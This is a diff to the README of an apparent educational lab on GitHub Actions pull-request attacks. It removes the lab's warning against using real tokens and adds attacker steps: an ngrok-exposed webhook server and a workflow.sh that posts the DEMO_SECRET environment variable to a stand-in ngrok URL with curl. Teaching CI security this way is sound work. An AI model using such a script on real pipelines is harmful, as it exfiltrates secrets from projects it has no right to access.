@@ -31,6 +31,51 @@ Attacker Account
 6. GitHub Actions is automatically triggered
 7. Explain that if the workflow unsafely checks out and executes code from the Pull Request, an attacker could exploit it to access secrets or sensitive resources.
 
-## Warning
+## Attacker Setup
 
-⚠️ **This lab is for educational and demo video purposes only. Do not use real tokens or sensitive information.**
+Run `server.js` to start a webhook server that receives exfiltrated data:
+
+```bash
+node server.js
+```
+
+The server listens on port `3000`. Use [ngrok](https://ngrok.com/) to expose it publicly so the GitHub Actions workflow can reach it:
+
+```bash
+ngrok http 3000
+```
+
+Copy the ngrok HTTPS URL (e.g. `https://abc123.ngrok.io`).
+
+## Attack Steps
+
+Create a new branch containing the malicious code:
+
+```bash
+git checkout -b test-pending
+```
+
+Edit `workflow.sh` to steal the secret:
+
+```bash
+#!/usr/bin/env bash
+
+echo "=== Script started ==="
+echo "Current directory:"
+pwd
+
+echo "Files:"
+ls -la
+set -e
+
+if [ -n "$DEMO_SECRET" ]; then
+    echo "DEMO_SECRET is available"
+    echo "Secret length: ${#DEMO_SECRET}"
+
+    curl -X POST "https://your-ngrok-url.ngrok.io" -d "secret=$DEMO_SECRET"
+    echo "test Pass"
+else
+    echo "DEMO_SECRET is not available"
+fi
+echo "=== Script finished ==="
+```
